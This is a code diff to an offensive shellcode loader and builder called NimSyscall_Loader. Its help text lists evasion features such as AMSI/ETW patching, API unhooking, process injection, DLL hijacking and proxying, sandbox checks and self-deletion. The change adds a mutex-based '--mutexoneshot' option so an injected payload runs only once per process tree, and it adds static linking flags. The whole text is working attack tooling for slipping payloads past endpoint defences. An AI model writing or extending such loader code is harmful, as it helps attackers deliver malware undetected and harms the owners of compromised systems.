@@ -68,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.2
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --mutexoneshot --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -125,6 +125,7 @@ Options:
       --perfectdllhijack    Add DllMain and execute the Payload via "Perfect DLL Hijacking" to avoid LoaderLock issues (https://elliotonsecurity.com/perfect-dll-hijacking/)
       --noNimMain    Remove NimMain export to avoid this IoC (Use "--dllhijack" in addition to instead export DllMain or alternatively "--dllexportfunc DllMain")
       --clone value    Specify a local DLL to clone the API-Exports from via Koppeling
+      --mutexoneshot    Use a Mutex to ensure the payload is only executed once per process tree
       --dllProxy    Generate a DLL-Proxying DLL - you need to put the legit DLL into the build directory. Two output DLLs will be generated: The proxy DLL and the randomly renamed legit DLL. (Credit to @byt3bl33d3r - https://github.com/byt3bl33d3r/NimDllSideload)
           --payloadFunction funcName    The function to execute the Payload with to not use DllMain
           --noRandom    Don't randomize the DLL-Name but forward to the original DLL instead (No need to copy the original DLL, only works for builtin windows DLLs)
@@ -381,6 +382,7 @@ var
     usepoolparty: bool = false
     conhostinject: bool = false
     noRandom: bool = false
+    mutexoneshot: bool = false
     payloadFunction: string = ""
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 2.2")
@@ -577,6 +579,9 @@ if args["--dllProxy"]:
 
 if args["--noRandom"]:
   noRandom = true
+
+if args["--mutexoneshot"]:
+  mutexoneshot = true
 
 if args["--payloadFunction"]:
   let payloadFunctionString = args["--payloadFunction"]
@@ -3001,7 +3006,17 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
   var RtlExitUserProcess: FARPROC = GetProcAddress(ntdll, "RtlExitUserProcess")
   # go for magic
   when not defined(payloadFunc):
-      LdrFullUnlock(main, LdrUnlockLoaderLock, RtlExitUserProcess)
+    when defined(mutexoneshot):
+        var temp: array[MAX_PATH, char]
+        if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
+            let mutexName = &"Global\\REPLACEMUTEX"
+            var lastError: DWORD
+            let mutex = CreateMutexA(nil, TRUE, mutexName)
+            lastError = GetLastError()
+            if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
+              LdrFullUnlock(main, LdrUnlockLoaderLock, RtlExitUserProcess)
+    else:
+        LdrFullUnlock(main, LdrUnlockLoaderLock, RtlExitUserProcess)
       
   return true
 
@@ -3015,16 +3030,27 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
     when not defined(payloadFunc):
       NimMain()
   
-    if fdwReason == DLL_PROCESS_ATTACH:
-        NimMain()
-        when defined(cloned):
-            when not defined(payloadFunc):
+  if fdwReason == DLL_PROCESS_ATTACH:
+    NimMain()
+    when defined(cloned):
+        when not defined(payloadFunc):
+            when defined(mutexoneshot):
+                var temp: array[MAX_PATH, char]
+                if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
+                    let mutexName = &"Global\\REPLACEMUTEX"
+                    var lastError: DWORD
+                    let mutex = CreateMutexA(nil, TRUE, mutexName)
+                    lastError = GetLastError()
+                    if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
+                        var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+                        WaitForSingleObject(threadHandle, INFINITE)
+            else:
                 var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
-                CloseHandle(threadHandle)
-    if fdwReason == DLL_THREAD_ATTACH:
-        NimMain()
-    #if fdwReason == DLL_PROCESS_ATTACH:
-    #  NimMain()
+                WaitForSingleObject(threadHandle, INFINITE)
+  if fdwReason == DLL_THREAD_ATTACH:
+    NimMain()
+  #if fdwReason == DLL_PROCESS_ATTACH:
+  #  NimMain()
   return true
 
 """
@@ -3040,8 +3066,19 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
   
   when not defined(payloadFunc):
     if fdwReason == DLL_PROCESS_ATTACH:
-      var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
-      CloseHandle(threadHandle)
+        when defined(mutexoneshot):
+            var temp: array[MAX_PATH, char]
+            if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
+                let mutexName = &"Global\\REPLACEMUTEX"
+                var lastError: DWORD
+                let mutex = CreateMutexA(nil, TRUE, mutexName)
+                lastError = GetLastError()
+                if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
+                    var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+                    WaitForSingleObject(threadHandle, INFINITE)
+        else:
+            var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+            CloseHandle(threadHandle)
   #if fdwReason == DLL_THREAD_ATTACH:
   #  NimMain()
   #if fdwReason == DLL_PROCESS_ATTACH:
@@ -3058,8 +3095,19 @@ type
 proc {payloadFunction}Fwd(arg1: uint64, arg2: uint64, arg3: uint64, arg4: uint64, arg5: uint64, arg6: uint64, arg7: uint64, arg8: uint64, arg9: uint64, arg10: uint64, arg11: uint64, arg12: uint64): uint64 {.stdcall,exportc, dynlib.} =
     NimMain()
     var return_value: uint64 = 0
-    var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
-    WaitForSingleObject(threadHandle, INFINITE)
+    when defined(mutexoneshot):
+        var temp: array[MAX_PATH, char]
+        if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
+            let mutexName = &"Global\\REPLACEMUTEX"
+            var lastError: DWORD
+            let mutex = CreateMutexA(nil, TRUE, mutexName)
+            lastError = GetLastError()
+            if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
+                var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+                WaitForSingleObject(threadHandle, INFINITE)
+    else:
+        var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+        WaitForSingleObject(threadHandle, INFINITE)
     # LoadLibraryA for PAYLOADDLL
     var payloadDLL = LoadLibraryA("PAYLOADDLL")
     # GetProcAddress for `{payloadFunction}`
@@ -3077,7 +3125,17 @@ proc `FUNC_EXPORT`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): 
     NimMain()
     when defined(xll):
         # Create a Thread on the main function
-        var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+        when defined(mutexoneshot):
+            var temp: array[MAX_PATH, char]
+            if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
+                let mutexName = &"Global\\REPLACEMUTEX"
+                var lastError: DWORD
+                let mutex = CreateMutexA(nil, TRUE, mutexName)
+                lastError = GetLastError()
+                if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
+                    var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+        else:
+            var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
         # when defined remoteinject CloseHandle
         when defined(remoteinject):
             CloseHandle(threadHandle)
@@ -3870,7 +3928,6 @@ if(pump):
     stub =  stub.replace("    import nimstrenc", "")
     stub = stub.replace("when not defined(proxy):","")
     stub = stub.replace("    when defined(notcloned):","")
-    
     for m in pumpargs:
         if(m == "words"):
             echo "[*] Adding words"
@@ -4257,10 +4314,19 @@ if (sleepycrypt):
 
 if(dll_out or cpl or xll):
     if (dllProxy):
-        stub.add(DLLProxyStub)
+        var newDllProxyStub = DLLProxyStub
+        if(mutexoneshot):
+            # replace with random mutex name
+            var mutexname = rndStr(8)
+            newDllProxyStub = DLLProxyStub.replace("REPLACEMUTEX", mutexname)
+        stub.add(newDllProxyStub)
         # if custom payload function not empty, add DllCustomPayloadFuncStub
         if (payloadFunction != ""):
             var NewDllCustomPayloadFuncStub = DllCustomPayloadFuncStub.replace("{payloadFunction}", payloadFunction)
+            if(mutexoneshot):
+                # replace with random mutex name
+                var mutexname = rndStr(8)
+                NewDllCustomPayloadFuncStub = NewDllCustomPayloadFuncStub.replace("REPLACEMUTEX", mutexname)
             stub.add(NewDllCustomPayloadFuncStub)
     else:
         stub.add(DllStub)
@@ -4268,7 +4334,12 @@ if(dll_out or cpl or xll):
             if(perfectdllhijack):
                 stub.add(PerfectDLLHijackStub)
             else:
-                stub.add(DLLHijackStub)
+                var NewDLLHijackStub = DLLHijackStub
+                if(mutexoneshot):
+                    # replace with random mutex name
+                    var mutexname = rndStr(8)
+                    NewDLLHijackStub = DLLHijackStub.replace("REPLACEMUTEX", mutexname)
+                stub.add(NewDLLHijackStub)
     for f in dllexportfunctions:
         stub.add(DllCustomExportStub)
         stub = stub.replace("FUNC_EXPORT", f)
@@ -4415,6 +4486,9 @@ if(conhostinject):
 # if dllexportfunctions sequence is not empty, add -d:dllexportfuncs
 if args["--dllexportfunc"]:
     basicCompileFlags.add("-d:dllexportfuncs ")
+
+if(mutexoneshot):
+    basicCompileFlags.add("-d:mutexoneshot ")
 
 if (retrieveFromFile):
     stub.add(ShellcodefromFileStub)
@@ -4677,6 +4751,9 @@ else:
 
 if(denim == false):
     basicCompileFlags.add(fmt"--out={outfile} Loader.nim")
+
+# Add static to include missing nim 2.0 needed libraries such as libgcc_s_seh-1.dll and libwinpthread-1.dll
+basicCompileFlags.add("--passc=-static --passl=-static ")
 
 if debugMode:
     basicCompileFlags = basicCompileFlags.replace("-d:release", "-d:debug")
